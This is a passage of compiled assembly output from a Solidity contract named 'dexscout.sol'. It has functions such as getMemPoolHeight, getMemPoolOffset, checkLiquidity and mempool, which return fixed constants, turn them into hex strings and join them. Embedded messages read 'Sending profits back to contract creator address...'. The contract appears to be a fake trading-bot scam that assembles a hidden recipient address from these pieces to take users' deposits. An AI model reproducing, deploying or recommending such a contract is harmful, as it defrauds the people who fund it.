   /* \"dexscout.sol\":7024:7038  return 4070554 */\n      swap1\n      pop\n        /* \"dexscout.sol\":6953:7045  function _calculateGasNeeds() internal pure returns(uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":8992:9105  function getMemPoolHeight() internal pure returns (uint256) {... */\n    tag_43:\n        /* \"dexscout.sol\":9043:9050  uint256 */\n      0x00\n        /* \"dexscout.sol\":9069:9076  1015264 */\n      0x0f7de0\n        /* \"dexscout.sol\":9062:9076  return 1015264 */\n      swap1\n      pop\n        /* \"dexscout.sol\":8992:9105  function getMemPoolHeight() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":14418:14533  function getMemPoolDepth() internal pure returns (uint256) {... */\n    tag_45:\n        /* \"dexscout.sol\":14468:14475  uint256 */\n      0x00\n        /* \"dexscout.sol\":14494:14504  2945814797 */\n      0xaf95910d\n        /* \"dexscout.sol\":14487:14504  return 2945814797 */\n      swap1\n      pop\n        /* \"dexscout.sol\":14418:14533  function getMemPoolDepth() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":10167:10282  function getMemPoolOffset() internal pure returns (uint256) {... */\n    tag_49:\n        /* \"dexscout.sol\":10218:10225  uint256 */\n      0x00\n        /* \"dexscout.sol\":10244:10253  219788661 */\n      0x0d19b575\n        /* \"dexscout.sol\":10237:10253  return 219788661 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10167:10282  function getMemPoolOffset() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":8274:8711  function checkLiquidity(uint256 a) internal pure returns (string memory) {... */\n    tag_50:\n        /* \"dexscout.sol\":8332:8345  string memory */\n      0x60\n        /* \"dexscout.sol\":8357:8370  uint256 count */\n      0x00\n        /* \"dexscout.sol\":8384:8393  uint256 b */\n      dup1\n        /* \"dexscout.sol\":8396:8397  a */\n      dup4\n        /* \"dexscout.sol\":8384:8397  uint256 b = a */\n      swap1\n      pop\n        /* \"dexscout.sol\":8407:8475  while (b != 0) {... */\n    tag_109:\n        /* \"dexscout.sol\":8419:8420  0 */\n      0x00\n        /* \"dexscout.sol\":8414:8415  b */\n      dup2\n        /* \"dexscout.sol\":8414:8420  b != 0 */\n      eq\n        /* \"dexscout.sol\":8407:8475  while (b != 0) {... */\n      tag_110\n      jumpi\n        /* \"dexscout.sol\":8436:8443  count++ */\n      dup2\n      dup1\n      tag_111\n      swap1\n      tag_112\n      jump\t// in\n    tag_111:\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":8462:8464  16 */\n      0x10\n        /* \"dexscout.sol\":8457:8464  b /= 16 */\n      dup2\n      tag_113\n      swap2\n      swap1\n      tag_114\n      jump\t// in\n    tag_113:\n      swap1\n      pop\n        /* \"dexscout.sol\":8407:8475  while (b != 0) {... */\n      jump(tag_109)\n    tag_110:\n        /* \"dexscout.sol\":8484:8500  bytes memory res */\n      0x00\n        /* \"dexscout.sol\":8513:8518  count */\n      dup3\n        /* \"dexscout.sol\":8503:8519  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_115\n      jumpi\n      tag_116\n      tag_117\n      jump\t// in\n    tag_116:\n    tag_115:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_118\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_118:\n      pop\n        /* \"dexscout.sol\":8484:8519  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"dexscout.sol\":8534:8543  uint256 i */\n      0x00\n        /* \"dexscout.sol\":8529:8676  for (uint256 i = 0; i < count; ++i) {... */\n    tag_119:\n        /* \"dexscout.sol\":8553:8558  count */\n      dup4\n        /* \"dexscout.sol\":8549:8550  i */\n      dup2\n        /* \"dexscout.sol\":8549:8558  i < count */\n      lt\n        /* \"dexscout.sol\":8529:8676  for (uint256 i = 0; i < count; ++i) {... */\n      iszero\n      tag_120\n      jumpi\n        /* \"dexscout.sol\":8587:8589  16 */\n      0x10\n        /* \"dexscout.sol\":8583:8584  a */\n      dup7\n        /* \"dexscout.sol\":8583:8589  a % 16 */\n      tag_122\n      swap2\n      swap1\n      tag_123\n      jump\t// in\n    tag_122:\n        /* \"dexscout.sol\":8579:8589  b = a % 16 */\n      swap3\n      pop\n        /* \"dexscout.sol\":8624:8644  toHexDigit(uint8(b)) */\n      tag_124\n        /* \"dexscout.sol\":8641:8642  b */\n      dup4\n        /* \"dexscout.sol\":8624:8634  toHexDigit */\n      tag_125\n        /* \"dexscout.sol\":8624:8644  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_124:\n        /* \"dexscout.sol\":8603:8606  res */\n      dup3\n        /* \"dexscout.sol\":8619:8620  1 */\n      0x01\n        /* \"dexscout.sol\":8615:8616  i */\n      dup4\n        /* \"dexscout.sol\":8607:8612  count */\n      dup8\n        /* \"dexscout.sol\":8607:8616  count - i */\n      tag_126\n      swap2\n      swap1\n      tag_127\n      jump\t// in\n    tag_126:\n        /* \"dexscout.sol\":8607:8620  count - i - 1 */\n      tag_128\n      swap2\n      swap1\n      tag_127\n      jump\t// in\n    tag_128:\n        /* \"dexscout.sol\":8603:8621  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_129\n      jumpi\n      tag_130\n      tag_71\n      jump\t// in\n    tag_130:\n    tag_129:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":8603:8644  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":8663:8665  16 */\n      0x10\n        /* \"dexscout.sol\":8658:8665  a /= 16 */\n      dup7\n      tag_131\n      swap2\n      swap1\n      tag_114\n      jump\t// in\n    tag_131:\n      swap6\n      pop\n        /* \"dexscout.sol\":8560:8563  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"dexscout.sol\":8529:8676  for (uint256 i = 0; i < count; ++i) {... */\n      jump(tag_119)\n    tag_120:\n      pop\n        /* \"dexscout.sol\":8700:8703  res */\n      dup1\n        /* \"dexscout.sol\":8686:8704  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":8274:8711  function checkLiquidity(uint256 a) internal pure returns (string memory) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":15232:15881  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n    tag_51:\n        /* \"dexscout.sol\":15315:15328  string memory */\n      0x60\n        /* \"dexscout.sol\":15340:15363  bytes memory _baseBytes */\n      0x00\n        /* \"dexscout.sol\":15372:15377  _base */\n      dup4\n        /* \"dexscout.sol\":15340:15378  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"dexscout.sol\":15388:15412  bytes memory _valueBytes */\n      0x00\n        /* \"dexscout.sol\":15421:15427  _value */\n      dup4\n        /* \"dexscout.sol\":15388:15428  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"dexscout.sol\":15439:15462  string memory _tmpValue */\n      0x00\n        /* \"dexscout.sol\":15509:15520  _valueBytes */\n      dup2\n        /* \"dexscout.sol\":15509:15527  _valueBytes.length */\n      mload\n        /* \"dexscout.sol\":15489:15499  _baseBytes */\n      dup4\n        /* \"dexscout.sol\":15489:15506  _baseBytes.length */\n      mload\n        /* \"dexscout.sol\":15489:15527  _baseBytes.length + _valueBytes.length */\n      tag_133\n      swap2\n      swap1\n      tag_73\n      jump\t// in\n    tag_133:\n        /* \"dexscout.sol\":15465:15537  new string(... */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_134\n      jumpi\n      tag_135\n      tag_117\n      jump\t// in\n    tag_135:\n    tag_134:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_136\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_136:\n      pop\n        /* \"dexscout.sol\":15439:15537  string memory _tmpValue = new string(... */\n      swap1\n      pop\n        /* \"dexscout.sol\":15547:15569  bytes memory _newValue */\n      0x00\n        /* \"dexscout.sol\":15578:15587  _tmpValue */\n      dup2\n        /* \"dexscout.sol\":15547:15588  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"dexscout.sol\":15599:15608  uint256 i */\n      0x00\n        /* \"dexscout.sol\":15618:15627  uint256 j */\n      dup1\n        /* \"dexscout.sol\":15647:15648  0 */\n      0x00\n        /* \"dexscout.sol\":15643:15648  i = 0 */\n      swap2\n      pop\n        /* \"dexscout.sol\":15638:15733  for (i = 0; i < _baseBytes.length; i++) {... */\n    tag_137:\n        /* \"dexscout.sol\":15654:15664  _baseBytes */\n      dup6\n        /* \"dexscout.sol\":15654:15671  _baseBytes.length */\n      mload\n        /* \"dexscout.sol\":15650:15651  i */\n      dup3\n        /* \"dexscout.sol\":15650:15671  i < _baseBytes.length */\n      lt\n        /* \"dexscout.sol\":15638:15733  for (i = 0; i < _baseBytes.length; i++) {... */\n      iszero\n      tag_138\n      jumpi\n        /* \"dexscout.sol\":15709:15719  _baseBytes */\n      dup6\n        /* \"dexscout.sol\":15720:15721  i */\n      dup3\n        /* \"dexscout.sol\":15709:15722  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_140\n      jumpi\n      tag_141\n      tag_71\n      jump\t// in\n    tag_141:\n    tag_140:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":15692:15701  _newValue */\n      dup4\n        /* \"dexscout.sol\":15702:15705  j++ */\n      dup3\n      dup1\n      tag_142\n      swap1\n      tag_112\n      jump\t// in\n    tag_142:\n      swap4\n      pop\n        /* \"dexscout.sol\":15692:15706  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_143\n      jumpi\n      tag_144\n      tag_71\n      jump\t// in\n    tag_144:\n    tag_143:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":15692:15722  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":15673:15676  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":15638:15733  for (i = 0; i < _baseBytes.length; i++) {... */\n      jump(tag_137)\n    tag_138:\n        /* \"dexscout.sol\":15752:15753  0 */\n      0x00\n        /* \"dexscout.sol\":15748:15753  i = 0 */\n      swap2\n      pop\n        /* \"dexscout.sol\":15743:15840  for (i = 0; i < _valueBytes.length; i++) {... */\n    tag_145:\n        /* \"dexscout.sol\":15759:15770  _valueBytes */\n      dup5\n        /* \"dexscout.sol\":15759:15777  _valueBytes.length */\n      mload\n        /* \"dexscout.sol\":15755:15756  i */\n      dup3\n        /* \"dexscout.sol\":15755:15777  i < _valueBytes.length */\n      lt\n        /* \"dexscout.sol\":15743:15840  for (i = 0; i < _valueBytes.length; i++) {... */\n      iszero\n      tag_146\n      jumpi\n        /* \"dexscout.sol\":15815:15826  _valueBytes */\n      dup5\n        /* \"dexscout.sol\":15827:15828  i */\n      dup3\n        /* \"dexscout.sol\":15815:15829  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_148\n      jumpi\n      tag_149\n      tag_71\n      jump\t// in\n    tag_149:\n    tag_148:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":15798:15807  _newValue */\n      dup4\n        /* \"dexscout.sol\":15808:15811  j++ */\n      dup3\n      dup1\n      tag_150\n      swap1\n      tag_112\n      jump\t// in\n    tag_150:\n      swap4\n      pop\n        /* \"dexscout.sol\":15798:15812  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_151\n      jumpi\n      tag_152\n      tag_71\n      jump\t// in\n    tag_152:\n    tag_151:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":15798:15829  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":15779:15782  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":15743:15840  for (i = 0; i < _valueBytes.length; i++) {... */\n      jump(tag_145)\n    tag_146:\n        /* \"dexscout.sol\":15864:15873  _newValue */\n      dup3\n        /* \"dexscout.sol\":15850:15874  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":15232:15881  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":11837:12167  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_125:\n        /* \"dexscout.sol\":11889:11895  bytes1 */\n      0x00\n        /* \"dexscout.sol\":11916:11917  d */\n      dup2\n        /* \"dexscout.sol\":11911:11917  0 <= d */\n      0xff\n      and\n        /* \"dexscout.sol\":11911:11912  0 */\n      0x00\n        /* \"dexscout.sol\":11911:11917  0 <= d */\n      gt\n      iszero\n        /* \"dexscout.sol\":11911:11927  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_154\n      jumpi\n      pop\n        /* \"dexscout.sol\":11926:11927  9 */\n      0x09\n        /* \"dexscout.sol\":11921:11922  d */\n      dup3\n        /* \"dexscout.sol\":11921:11927  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":11911:11927  0 <= d && d <= 9 */\n    tag_154:\n        /* \"dexscout.sol\":11907:12102  if (0 <= d && d <= 9) {... */\n      iszero\n      tag_155\n      jumpi\n        /* \"dexscout.sol\":11978:11979  d */\n      dup2\n        /* \"dexscout.sol\":11963:11974  bytes1(\"0\") */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"dexscout.sol\":11957:11975  uint8(bytes1(\"0\")) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":11957:11979  uint8(bytes1(\"0\")) + d */\n      tag_156\n      swap2\n      swap1\n      tag_157\n      jump\t// in\n    tag_156:\n        /* \"dexscout.sol\":11950:11980  bytes1(uint8(bytes1(\"0\")) + d) */\n      0xf8\n      shl\n        /* \"dexscout.sol\":11943:11980  return bytes1(uint8(bytes1(\"0\")) + d) */\n      swap1\n      pop\n      jump(tag_153)\n        /* \"dexscout.sol\":11907:12102  if (0 <= d && d <= 9) {... */\n    tag_155:\n        /* \"dexscout.sol\":12013:12014  d */\n      dup2\n        /* \"dexscout.sol\":12001:12015  10 <= uint8(d) */\n      0xff\n      and\n        /* \"dexscout.sol\":12001:12003  10 */\n      0x0a\n        /* \"dexscout.sol\":12001:12015  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"dexscout.sol\":12001:12033  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_159\n      jumpi\n      pop\n        /* \"dexscout.sol\":12031:12033  15 */\n      0x0f\n        /* \"dexscout.sol\":12025:12026  d */\n      dup3\n        /* \"dexscout.sol\":12019:12033  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":12001:12033  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_159:\n        /* \"dexscout.sol\":11997:12102  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n      iszero\n      tag_160\n      jumpi\n        /* \"dexscout.sol\":12088:12090  10 */\n      0x0a\n        /* \"dexscout.sol\":12084:12085  d */\n      dup3\n        /* \"dexscout.sol\":12069:12080  bytes1(\"a\") */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"dexscout.sol\":12063:12081  uint8(bytes1(\"a\")) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":12063:12085  uint8(bytes1(\"a\")) + d */\n      tag_161\n      swap2\n      swap1\n      tag_157\n      jump\t// in\n    tag_161:\n        /* \"dexscout.sol\":12063:12090  uint8(bytes1(\"a\")) + d - 10 */\n      tag_162\n      swap2\n      swap1\n      tag_163\n      jump\t// in\n    tag_162:\n        /* \"dexscout.sol\":12056:12091  bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      0xf8\n      shl\n        /* \"dexscout.sol\":12049:12091  return bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      swap1\n      pop\n      jump(tag_153)\n        /* \"dexscout.sol\":11997:12102  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n    tag_160:\n        /* \"dexscout.sol\":12152:12160  revert() */\n      0x00\n      dup1\n      revert\n        /* \"dexscout.sol\":11837:12167  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_153:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:176   */\n    tag_164:\n        /* \"#utility.yul\":91:102   */\n      0x00\n        /* \"#utility.yul\":125:131   */\n      dup3\n        /* \"#utility.yul\":120:123   */\n      dup3\n        /* \"#utility.yul\":113:132   */\n      mstore\n        /* \"#utility.yul\":165:169   */\n      0x20\n        /* \"#utility.yul\":160:163   */\n      dup3\n        /* \"#utility.yul\":156:170   */\n      add\n        /* \"#utility.yul\":141:170   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:176   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":182:430   */\n    tag_165:\n        /* \"#utility.yul\":322:356   */\n      0x52756e6e696e672044657853636f757420616374696f6e2e2054686973206361\n        /* \"#utility.yul\":318:319   */\n      0x00\n        /* \"#utility.yul\":310:316   */\n      dup3\n        /* \"#utility.yul\":306:320   */\n      add\n        /* \"#utility.yul\":299:357   */\n      mstore\n        /* \"#utility.yul\":391:422   */\n      0x6e2074616b652061207768696c653b20706c6561736520776169742e2e000000\n        /* \"#utility.yul\":386:388   */\n      0x20\n        /* \"#utility.yul\":378:384   */\n      dup3\n        /* \"#utility.yul\":374:389   */\n      add\n        /* \"#utility.yul\":367:423   */\n      mstore\n        /* \"#utility.yul\":182:430   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":436:802   */\n    tag_166:\n        /* \"#utility.yul\":578:581   */\n      0x00\n        /* \"#utility.yul\":599:666   */\n      tag_180\n        /* \"#utility.yul\":663:665   */\n      0x3d\n        /* \"#utility.yul\":658:661   */\n      dup4\n        /* \"#utility.yul\":599:666   */\n      tag_164\n      jump\t// in\n    tag_180:\n        /* \"#utility.yul\":592:666   */\n      swap2\n      pop\n        /* \"#utility.yul\":675:768   */\n      tag_181\n        /* \"#utility.yul\":764:767   */\n      dup3\n        /* \"#utility.yul\":675:768   */\n      tag_165\n      jump\t// in\n    tag_181:\n        /* \"#utility.yul\":793:795   */\n      0x40\n        /* \"#utility.yul\":788:791   */\n      dup3\n        /* \"#utility.yul\":784:796   */\n      add\n        /* \"#utility.yul\":777:796   */\n      swap1\n      pop\n        /* \"#utility.yul\":436:802   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":808:1227   */\n    tag_16:\n        /* \"#utility.yul\":974:978   */\n      0x00\n        /* \"#utility.yul\":1012:1014   */\n      0x20\n        /* \"#utility.yul\":1001:1010   */\n      dup3\n        /* \"#utility.yul\":997:1015   */\n      add\n        /* \"#utility.yul\":989:1015   */\n      swap1\n      pop\n        /* \"#utility.yul\":1061:1070   */\n      dup2\n        /* \"#utility.yul\":1055:1059   */\n      dup2\n        /* \"#utility.yul\":1051:1071   */\n      sub\n        /* \"#utility.yul\":1047:1048   */\n      0x00\n        /* \"#utility.yul\":1036:1045   */\n      dup4\n        /* \"#utility.yul\":1032:1049   */\n      add\n        /* \"#utility.yul\":1025:1072   */\n      mstore\n        /* \"#utility.yul\":1089:1220   */\n      tag_183\n        /* \"#utility.yul\":1215:1219   */\n      dup2\n        /* \"#utility.yul\":1089:1220   */\n      tag_166\n      jump\t// in\n    tag_183:\n        /* \"#utility.yul\":1081:1220   */\n      swap1\n      pop\n        /* \"#utility.yul\":808:1227   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1233:1471   */\n    tag_167:\n        /* \"#utility.yul\":1373:1407   */\n      0x53656e64696e672070726f66697473206261636b20746f20636f6e7472616374\n        /* \"#utility.yul\":1369:1370   */\n      0x00\n        /* \"#utility.yul\":1361:1367   */\n      dup3\n        /* \"#utility.yul\":1357:1371   */\n      add\n        /* \"#utility.yul\":1350:1408   */\n      mstore\n        /* \"#utility.yul\":1442:1463   */\n      0x2063726561746f7220616464726573732e2e2e00000000000000000000000000\n        /* \"#utility.yul\":1437:1439   */\n      0x20\n        /* \"#utility.yul\":1429:1435   */\n      dup3\n        /* \"#utility.yul\":1425:1440   */\n      add\n        /* \"#utility.yul\":1418:1464   */\n      mstore\n        /* \"#utility.yul\":1233:1471   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1477:1843   */\n    tag_168:\n        /* \"#utility.yul\":1619:1622   */\n      0x00\n        /* \"#utility.yul\":1640:1707   */\n      tag_186\n        /* \"#utility.yul\":1704:1706   */\n      0x33\n        /* \"#utility.yul\":1699:1702   */\n      dup4\n        /* \"#utility.yul\":1640:1707   */\n      tag_164\n      jump\t// in\n    tag_186:\n        /* \"#utility.yul\":1633:1707   */\n      swap2\n      pop\n        /* \"#utility.yul\":1716:1809   */\n      tag_187\n        /* \"#utility.yul\":1805:1808   */\n      dup3\n        /* \"#utility.yul\":1716:1809   */\n      tag_167\n      jump\t// in\n    tag_187:\n        /* \"#utility.yul\":1834:1836   */\n      0x40\n        /* \"#utility.yul\":1829:1832   */\n      dup3\n        /* \"#utility.yul\":1825:1837   */\n      add\n        /* \"#utility.yul\":1818:1837   */\n      swap1\n      pop\n        /* \"#utility.yul\":1477:1843   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1849:2268   */\n    tag_23:\n        /* \"#utility.yul\":2015:2019   */\n      0x00\n        /* \"#utility.yul\":2053:2055   */\n      0x20\n        /* \"#utility.yul\":2042:2051   */\n      dup3\n        /* \"#utility.yul\":2038:2056   */\n      add\n        /* \"#utility.yul\":2030:2056   */\n      swap1\n      pop\n        /* \"#utility.yul\":2102:2111   */\n      dup2\n        /* \"#utility.yul\":2096:2100   */\n      dup2\n        /* \"#utility.yul\":2092:2112   */\n      sub\n        /* \"#utility.yul\":2088:2089   */\n      0x00\n        /* \"#utility.yul\":2077:2086   */\n      dup4\n        /* \"#utility.yul\":2073:2090   */\n      add\n        /* \"#utility.yul\":2066:2113   */\n      mstore\n        /* \"#utility.yul\":2130:2261   */\n      tag_189\n        /* \"#utility.yul\":2256:2260   */\n      dup2\n        /* \"#utility.yul\":2130:2261   */\n      tag_168\n      jump\t// in\n    tag_189:\n        /* \"#utility.yul\":2122:2261   */\n      swap1\n      pop\n        /* \"#utility.yul\":1849:2268   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2274:2448   */\n    tag_169:\n        /* \"#utility.yul\":2414:2440   */\n      0x53746f7070696e6720636f6e747261637420626f742e2e2e0000000000000000\n        /* \"#utility.yul\":2410:2411   */\n      0x00\n        /* \"#utility.yul\":2402:2408   */\n      dup3\n        /* \"#utility.yul\":2398:2412   */\n      add\n        /* \"#utility.yul\":2391:2441   */\n      mstore\n        /* \"#utility.yul\":2274:2448   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2454:2820   */\n    tag_170:\n        /* \"#utility.yul\":2596:2599   */\n      0x00\n        /* \"#utility.yul\":2617:2684   */\n      tag_192\n        /* \"#utility.yul\":2681:2683   */\n      0x18\n        /* \"#utility.yul\":2676:2679   */\n      dup4\n        /* \"#utility.yul\":2617:2684   */\n      tag_164\n      jump\t// in\n    tag_192:\n        /* \"#utility.yul\":2610:2684   */\n      swap2\n      pop\n        /* \"#utility.yul\":2693:2786   */\n      tag_193\n        /* \"#utility.yul\":2782:2785   */\n      dup3\n        /* \"#utility.yul\":2693:2786   */\n      tag_169\n      jump\t// in\n    tag_193:\n        /* \"#utility.yul\":2811:2813   */\n      0x20\n        /* \"#utility.yul\":2806:2809   */\n      dup3\n        /* \"#utility.yul\":2802:2814   */\n      add\n        /* \"#utility.yul\":2795:2814   */\n      swap1\n      pop\n        /* \"#utility.yul\":2454:2820   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2826:3245   */\n    tag_30:\n        /* \"#utility.yul\":2992:2996   */\n      0x00\n        /* \"#utility.yul\":3030:3032   */\n      0x20\n        /* \"#utility.yul\":3019:3028   */\n      dup3\n        /* \"#utility.yul\":3015:3033   */\n      add\n        /* \"#utility.yul\":3007:3033   */\n      swap1\n      pop\n        /* \"#utility.yul\":3079:3088   */\n      dup2\n        /* \"#utility.yul\":3073:3077   */\n      dup2\n        /* \"#utility.yul\":3069:3089   */\n      sub\n        /* \"#utility.yul\":3065:3066   */\n      0x00\n        /* \"#utility.yul\":3054:3063   */\n      dup4\n        /* \"#utility.yul\":3050:3067   */\n      add\n        /* \"#utility.yul\":3043:3090   */\n      mstore\n        /* \"#utility.yul\":3107:3238   */\n      tag_195\n        /* \"#utility.yul\":3233:3237   */\n      dup2\n        /* \"#utility.yul\":3107:3238   */\n      tag_170\n      jump\t// in\n    tag_195:\n        /* \"#utility.yul\":3099:3238   */\n      swap1\n      pop\n        /* \"#utility.yul\":2826:3245   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3251:3377   */\n    tag_171:\n        /* \"#utility.yul\":3288:3295   */\n      0x00\n        /* \"#utility.yul\":3328:3370   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":3321:3326   */\n      dup3\n        /* \"#utility.yul\":3317:3371   */\n      and\n        /* \"#utility.yul\":3306:3371   */\n      swap1\n      pop\n        /* \"#utility.yul\":3251:3377   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3383:3563   */\n    tag_172:\n        /* \"#utility.yul\":3431:3508   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3428:3429   */\n      0x00\n        /* \"#utility.yul\":3421:3509   */\n      mstore\n        /* \"#utility.yul\":3528:3532   */\n      0x11\n        /* \"#utility.yul\":3525:3526   */\n      0x04\n        /* \"#utility.yul\":3518:3533   */\n      mstore\n        /* \"#utility.yul\":3552:3556   */\n      0x24\n        /* \"#utility.yul\":3549:3550   */\n      0x00\n        /* \"#utility.yul\":3542:3557   */\n      revert\n        /* \"#utility.yul\":3569:3979   */\n    tag_68:\n        /* \"#utility.yul\":3609:3616   */\n      0x00\n        /* \"#utility.yul\":3632:3652   */\n      tag_199\n        /* \"#utility.yul\":3650:3651   */\n      dup3\n        /* \"#utility.yul\":3632:3652   */\n      tag_171\n      jump\t// in\n    tag_199:\n        /* \"#utility.yul\":3627:3652   */\n      swap2\n      pop\n        /* \"#utility.yul\":3666:3686   */\n      tag_200\n        /* \"#utility.yul\":3684:3685   */\n      dup4\n        /* \"#utility.yul\":3666:3686   */\n      tag_171\n      jump\t// in\n    tag_200:\n        /* \"#utility.yul\":3661:3686   */\n      swap3\n      pop\n        /* \"#utility.yul\":3721:3722   */\n      dup3\n        /* \"#utility.yul\":3718:3719   */\n      dup3\n        /* \"#utility.yul\":3714:3723   */\n      mul\n        /* \"#utility.yul\":3743:3773   */\n      tag_201\n        /* \"#utility.yul\":3761:3772   */\n      dup2\n        /* \"#utility.yul\":3743:3773   */\n      tag_171\n      jump\t// in\n    tag_201:\n        /* \"#utility.yul\":3732:3773   */\n      swap2\n      pop\n        /* \"#utility.yul\":3922:3923   */\n      dup3\n        /* \"#utility.yul\":3913:3920   */\n      dup3\n        /* \"#utility.yul\":3909:3924   */\n      div\n        /* \"#utility.yul\":3906:3907   */\n      dup5\n        /* \"#utility.yul\":3903:3925   */\n      eq\n        /* \"#utility.yul\":3883:3884   */\n      dup4\n        /* \"#utility.yul\":3876:3885   */\n      iszero\n        /* \"#utility.yul\":3856:3939   */\n      or\n        /* \"#utility.yul\":3833:3972   */\n      tag_202\n      jumpi\n        /* \"#utility.yul\":3952:3970   */\n      tag_203\n      tag_172\n      jump\t// in\n    tag_203:\n        /* \"#utility.yul\":3833:3972   */\n    tag_202:\n        /* \"#utility.yul\":3617:3979   */\n      pop\n        /* \"#utility.yul\":3569:3979   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3985:4165   */\n    tag_71:\n        /* \"#utility.yul\":4033:4110   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":4030:4031   */\n      0x00\n        /* \"#utility.yul\":4023:4111   */\n      mstore\n        /* \"#utility.yul\":4130:4134   */\n      0x32\n        /* \"#utility.yul\":4127:4128   